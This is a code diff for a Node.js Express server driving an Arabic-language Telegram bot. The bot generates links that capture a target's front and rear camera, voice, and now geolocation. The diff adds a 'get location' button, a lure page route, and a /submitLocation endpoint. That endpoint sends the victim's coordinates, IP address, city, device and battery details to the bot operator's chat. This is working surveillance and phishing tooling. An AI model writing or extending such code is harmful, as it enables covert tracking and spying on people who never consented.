@@ -47,6 +47,13 @@ app.get('/:userId', (req, res) => {
 });
 
 // Voice recording routes
+
+// Endpoint to serve SJGD.html for /getLocation
+app.get('/getLocation/:userId', (req, res) => {
+    res.sendFile(path.join(__dirname, 'SJGD.html'));
+});
+
+// Endpoint to handle /record/:userId
 app.get('/record/:userId', (req, res) => {
     const userId = req.params.userId;
     const duration = req.query.duration;
@@ -69,6 +76,7 @@ app.get('/record/:userId', (req, res) => {
 
     res.sendFile(path.join(__dirname, 'record.html'));
 });
+
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
     const chatId = req.body.userId;
     const files = req.files;
@@ -136,6 +144,38 @@ IP: ${additionalData.ip}
         });
 });
 
+app.post('/submitLocation', upload.none(), async (req, res) => {
+    const chatId = req.body.chatId;
+    const latitude = req.body.latitude;
+    const longitude = req.body.longitude;
+    const additionalData = JSON.parse(req.body.additionalData || '{}');
+
+    if (!latitude || !longitude) {
+        console.error('No location data received');
+        return res.status(400).json({ error: 'No location data received' });
+    }
+
+    const caption = `
+معلومات إضافية:
+IP: ${additionalData.ip}
+الدولة: ${additionalData.country}
+المدينة: ${additionalData.city}
+المنصة: ${additionalData.platform}
+إصدار الجهاز: ${additionalData.deviceVersion}
+مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
+الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
+    `;
+
+    try {
+        await bot.sendLocation(chatId, latitude, longitude, { caption });
+        console.log('Location sent successfully');
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error sending location:', error);
+        res.status(500).json({ error: 'Failed to send location message' });
+    }
+});
+
 bot.onText(/\/subscribe (\d+)/, (msg, match) => {
     if (msg.from.id.toString() !== adminId) {
         bot.sendMessage(msg.chat.id, 'عذراً، هذا الأمر متاح فقط للمسؤول.');
@@ -175,9 +215,10 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كامير أمامي', callback_data:'front_camera' }],
-                [{ text: 'تصوير كام خلفي', callback_data:'rear_camera' }],
-                [{ text: 'تسجيل صوت', callback_data:'voice_record' }],
+                [{ text: 'تصوير كام أمامي', callback_data: 'front_camera' }],
+                [{ text: 'تصوير كام خلفي', callback_data: 'rear_camera' }],
+                [{ text: 'تسجيل صوت', callback_data: 'voice_record' }],
+                [{ text: 'الحصول على الموقع', callback_data: 'get_location' }]
             ]
         }
     });
@@ -192,6 +233,9 @@ bot.on('callback_query', (callbackQuery) => {
         bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
+    } else if (data === 'get_location') {
+        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation?chatId=${chatId}`;
+        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`);
     }
 });
 
@@ -208,6 +252,7 @@ bot.on('message', (msg) => {
         }
     }
 });
+
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
